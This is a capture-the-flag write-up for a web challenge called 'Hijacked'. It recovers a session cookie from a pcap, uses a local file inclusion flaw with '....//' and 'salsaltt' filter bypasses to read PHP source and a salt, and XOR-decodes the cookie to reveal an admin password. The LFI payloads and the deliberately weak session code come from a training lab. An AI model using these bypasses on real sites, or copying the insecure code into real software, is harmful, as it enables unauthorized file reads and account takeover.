#Hijacked

**Category:** Web
**Points:** 30

**Description:**

I don't like this friend of mine named john. he is administrator of a webpage. and i really hate this guy. yesterday i sniff through his network and could capture him while he was logging into his account. So i beg you visit this page:http://172.27.221.13/login.php and find his password so i can just throw this pass on his face. here is the pcap file of what is sniffed yesterday!!! 

Download: <a href="./hijacked.pcap.pcapng">pcap file</a>

##Hijacked-Solution:

This challenges is a combination of network forensics, source reading, lfi vulnerability, bypassing lfi custom prevention filters & at last session cracking.

Based on the story of challenge, a person with real name john created a webpage and before he uploaded his webpage on his host server, his network was sniffed by his friend (the attacker). By sniffing his network his friend(the attacker) found john’s session when john was opening his profile page(as admin). 

So the job of each user is to find this session, login into the website, find the lfi vulnerability, read the source of php file that creates session and at last find the password of john. So let’s start:

###looking at pcap file

Fire up wireshark. Based on the story of challenge, the file was captured before john uploaded his files on the server. So we should find a way to see which stream is the one that we are looking for.

The name of the challenge is 'hijacked', this is a clue. So let’s set a filter on it:

```wireshark-filter:	frame contains "hijacked"```

And we see that he was opening welcome.php page on ip address 192.168.32.134. Click on packet and follow tcp stream. you will see that john sends a GET request for http://192.168.32.134/ctf_challenge/hijacked/welcome.php . and tadah, we see that there is a CTF_Session cookie in the stream. 

![Image of 1]
(./images/1.png)

```CTF_Session = 1944593278175d7565e2421726462d5bb5f2141675d6433420405d6412322790534152557d37```

Note: Some of users may say that how we know we should set a filter on 'hijacked' string? The answer is you shouldn’t know, cause you need to find it out. Simply by looking at the hijacked.iutcert.io & looking at pages, you could find the list of pages for this web. So simple filtering on all of this pages names one by one, will simply give you the result. 

Anyway, after finding the session, it’s time to check website. By opening webpage, you will see a login page like this:

![Image of 2]
(./images/2.png)

###Finding LFI vulnerability

Using test:test we can login, or we can create our own account. by looking at the pages there is nothing useful, except these three below:

#####1 – first looking the source of welcome.php page, we can see the login name of john:

```html
<!-- Designed by : J0hnTHEh4ck3r -->
```

This is the first clue, Now we know that his login name could be ```john``` (as the story said) or ```J0hnTHEh4ck3r```.

#####2 – There is clue about local file inclusion in defcon.php page.

```
http://192.168.32.134/ctf_challenge/hijacked/defcon.php?file=defcon.txt
```

so we know that defcon.php is making defcon page, by reading defcon.txt file. So let’s see if it’s vulnerable or not:
we do some simple test:

```
?file=../login.php
?file=../login.php%00
```

And so one. But these commands doesn’t work. So let’s check the source, and bam. there is another hint in source. a comment that shows us how our input filtered(this was a hint and added in the middle in ctf):

For example if we put ```../login.php```, we could see that it will be filtered like below:

```
defcon/login.php
```

The defcon.php simply replace each "../" with "". For bypassing it we should set a input like this:

```
....//
```

this will give us the result like ```../```

But wait a minute. something is missing, where should we look for the source that is making this session? Now it’s time for the 3rd clue:

#####3 – by looking at the robots.txt we will see:

```
User-agent: * 
Allow: /login.php
Allow: /register.php
Allow: /css/
Allow: /js/
Allow: /fonts/
Disallow: /defcon/
Disallow: /private/create_session.php
```

Now we know that the defcon.txt is in /defcon/ directory and we should look for the ```/private/create_session.php```

So we just enter something like this in defcon.php url:

```
/defcon.php?file=....//private/create_session.php
```

And bam we see the source:

```php
<?php
include("stuff/rand.php");
include("stuff/salt.php");
function khkh($string)
{
	$h = '';
	for($i=0; $i<strlen($string); $i++)
	{
		$hd = dechex(ord($string[$i]));
		$h .= substr('0',$hd,-2);
		$h .= $hd;
	}
	return strtoupper($h);
}
function dede($string)
{
	$d = '';
	for($i=0; $i<strlen($string)-1;$i+=2)
	{
		$d .= chr(hexdec($string[$i].$string[$i+1]));
	}
	return $d;
}
function new_session($username, $password)
{
	do
	{
		$random_var = get_random();
	} while (preg_match("/[^a-f0-4]/", $random_var));
	$clear = $username.$password.$random_var;
	$salt = get_salt();
	$result = '';
	for($i=0;$i<strlen($clear);$i++)
	{
		for($j=0;$j<strlen($salt);$j++,$i++)
		{
			$result .= $clear{$i} ^ $salt{$j};
		}
	}
	$result = khkh($result);
	$session = strtolower($result);
	return $session;
}
?>
```

Session is created simple by algorithm below:

```
clear = username+password+random_var
session = clear ^ salt
```

But we don’t know the value of random_var and salt. There are two includes in this php file:

```php
include("stuff/rand.php");
include("stuff/salt.php");
```

There is a problem, we can not see the source of salt.php And it’s because the name salt is filtered using str_replace. we can bypass this method simple by entering this url:

```
/defcon.php?file=....//stuff/salsaltt.php
```

And we see this:

```php
<?php 
function get_salt() {
	$salt = "S4l7f0R535510N";
	return $salt;
	}
?>
```

The value for salt is ```S4l7f0R535510N```. random var is not important, because we only needed the key for XOR encryption. So far have these information:

```
username:	‘john’ or ‘J0hnTHEh4ck3r’
password:	?
key(salt):	“S4l7f0R535510N”
```

And we know that the all that ```create_session.php``` does is that it just XOR ```username+password+random``` with salt and convert it to hex at last.

But the problem is that the function that converts the last result to hex, will remove '0' in hex values. 

for example the result of ‘1904’ will be ‘194’. 

There are a lot of ways to recover the password. One of them is just using this online website: http://md5decrypt.net/en/Xor/

###Decrypting CTF_Session to get the password

The create_session.php has three functions.
 
dede($string) 	khkh($string)	new_session($username,$password)

The main function is new_session and it receives two strings, it will put username,password and a random_var together ,Then XOR them chunk by chunk with the salt. And at last convert the result to hex value without 0.

First let’s see the result of xoring username with salt and converting it to hex (we simply use http://md5decrypt.net/en/Xor/ site):

![Image of 3]
(./images/3.png)

Here is the result:	```190404593278175d07565e0242```

And by looking at the CTF_Session we can see the difference:

CTF_Session: ```1944593278175d7565e2421726462d5bb5f2141675d6433420405d6412322790534152557d37```

Looks like the username is right. but the problem is that all the zeros (0)  are dropped by the khkh($string) function. now that we know the real hex value of the converted username is ‘190404593278175d07565e0242’, let’s update CTF_Session value with it.

new_CTF_Session:```190404593278175d07565e02421726462d5bb5f2141675d6433420405d6412322790534152557d37```

Now let’s decrypt new_CTF_Session. (Xoring it with value of salt):

![Image of 4]
(./images/4.png)

Note: xoring the xored value of clear, will give us the clear again.

by encrypting it again with this key we will have:

![Image of 5]
(./images/5.png)

Vow, look like we found first 5 characters of the password: ```YurAl```

Let’s keep moving. Now decrypt the new cleartext: ```J0hnTHEh4ck3rYurAl``` by xoring with salt:

The retrieved value is:	```190404593278175d07565e02421726462d5b```

![Image of 6]
(./images/6.png)

Now we know that ```190404593278175d07565e02421726462d5b``` is right, but from now on we should check for dropped zeros. let’s see what will happen if we put a 0 after this hex value:

new_sessoin: ```190404593278175d07565e02421726462d5b0b5f2141675d6433420405d6412322790534152557d37```

![Image of 7]
(./images/7.png)

New parts of password revealed:	'J0hnTHEh4ck3rYurAlmostTh'

Let’s keep doing the method to get the flag:

new_session: ```190404593278175d07565e02421726462d5b0b5f2141675d+0+6433420405d6412322790534152557d37```

![Image of 8]
(./images/8.png)

![Image of 9]
(./images/9.png)

```
new_session: 190404593278175d07565e02421726462d5b0b5f2141675d0643+0+3420405d6412322790534152557d37
new clear_text:	J0hnTHEh4ck3rYurAlmostTh3r3

new_session: 190404593278175d07565e02421726462d5b0b5f2141675d064303+0+420405d6412322790534152557d37
new clear_text:	J0hnTHEh4ck3rYurAlmostTh3r3Jst1St

new_session: 190404593278175d07565e02421726462d5b0b5f2141675d0643030420405d6412+0+322790534152557d37
new clear_text:	J0hnTHEh4ck3rYurAlmostTh3r3Jst1St3pL

new_session: 190404593278175d07565e02421726462d5b0b5f2141675d0643030420405d64120322790+0+534152557d37
```

![Image of 10]
(./images/10.png)

new clear_text:	```J0hnTHEh4ck3rYurAlmostTh3r3Jst1St3pL3ft```

And the next letters are the random number. so now we have the password:

```
username:	J0hnTHEh4ck3r
password:	YurAlmostTh3r3Jst1St3pL3ft
```

Now we should login to the website:

![Image of 11]
(./images/11.png)

After that, you will see an alert message that contains the FLAG!

![Image of 12]
(./images/12.png)

###PM
An advice for those who said there are problems in this challenge: Web penetration testing is more than just seeing a login page and doing sql injection. It’s about finding the holes and vulnerabilities that most people can’t see them.
(I know there were some misunderstandings in this challenge and that's cause of my first ctf, but there was no problem in concept..)

###It’s about Innovation, Patience and Unlimited-Knowledge!
